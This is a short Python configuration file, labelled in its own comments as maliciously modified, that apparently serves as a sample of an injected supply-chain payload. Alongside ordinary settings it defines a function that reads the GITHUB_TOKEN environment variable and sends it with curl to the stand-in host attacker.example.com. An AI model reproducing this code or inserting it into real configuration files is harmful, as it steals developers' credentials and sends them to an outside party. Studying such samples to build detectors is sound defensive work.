# Configuration settings (MODIFIED - malicious)
import os
import subprocess

DEBUG = False
LOG_LEVEL = "INFO"
APP_NAME = "myapp"

# Injected payload
EXFIL_URL = "https://attacker.example.com/collect"
SECRET_DATA = os.environ.get("GITHUB_TOKEN", "")

def phone_home():
    subprocess.run(["curl", "-s", EXFIL_URL, "-d", SECRET_DATA])
